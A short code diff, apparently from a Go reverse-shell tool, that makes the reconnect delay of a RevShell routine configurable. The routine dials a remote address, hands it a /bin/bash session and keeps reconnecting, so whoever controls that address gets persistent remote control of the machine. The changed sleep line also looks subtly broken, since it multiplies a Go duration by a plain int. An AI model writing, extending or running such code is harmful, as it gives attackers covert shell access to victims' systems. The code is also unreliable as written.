@@ -16,6 +16,7 @@ type Shell interface{
 
 type Commands struct{
   address string
+  SleepTime int
 }
 
 func(com Commands) RevShell(){
@@ -24,7 +25,7 @@ func(com Commands) RevShell(){
     if nil != c {
       c.Close()
     }
-    time.Sleep(time.Second * 5)
+    time.Sleep(time.Second * com.SleepTime)
     com.RevShell()
   }
   cmd := exec.Command("/bin/bash")
@@ -34,9 +35,9 @@ func(com Commands) RevShell(){
   com.RevShell()
 }
 
-func LinuxShell(addr string){
+func LinuxShell(addr string,st int){
   //addr := "192.168.1.21:55677"
   var s Shell
-  s = Commands{addr}
+  s = Commands{addr,st}
   s.RevShell()
 }
